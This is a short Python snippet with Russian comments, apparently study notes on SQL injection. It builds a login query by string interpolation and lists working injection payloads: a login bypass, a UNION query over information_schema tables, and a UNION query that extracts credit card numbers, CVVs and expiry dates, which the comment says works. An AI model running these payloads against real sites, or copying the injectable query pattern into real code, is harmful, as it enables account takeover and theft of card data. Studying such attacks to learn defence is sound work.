name = "' or true; -- "
password = ""

query = f"""
select *
from user
where name = {name} and password = {password}
"""

print(query)
cur.execute(query)

# мы этот name пишем в форме на сайте, это инъекция, у нас выводятся все пользователи с их паролями!

name = "' or true union select '1', table_name from information_schema.tables ;-- "  #это не знаю

name = "' or true union select '1', ccnumber, ccv, expiration, '5', '6', '7' from credit_cards; -- "  # работает


